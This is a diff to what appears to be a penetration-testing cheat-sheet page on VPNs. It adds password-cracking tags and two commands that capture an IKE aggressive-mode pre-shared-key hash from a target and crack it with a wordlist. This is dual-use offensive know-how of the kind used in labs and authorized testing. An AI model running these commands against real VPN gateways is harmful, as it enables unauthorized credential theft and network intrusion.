@@ -1,7 +1,6 @@
 ---
 title: "VPN"
-date: 2024-7-9
-tags: ["VPN", "Internet Key Exchange", "IKE", "Network", "IPSec"]
+tags: ["VPN", "Internet Key Exchange", "IKE", "Network", "IPSec", "Password Cracking", "PSK"]
 ---
 
 ### Enum
@@ -14,6 +13,16 @@ ike-scan -M <TARGET>
 ```console
 # Check with ikeV2
 ike-scan -M --ikev2 <TARGET>
+```
+
+```console
+# Get hash
+ike-scan -A --pskcrack=hash.txt <TARGET>
+```
+
+```console
+# Crack the hash
+psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 ### Connect to VPN
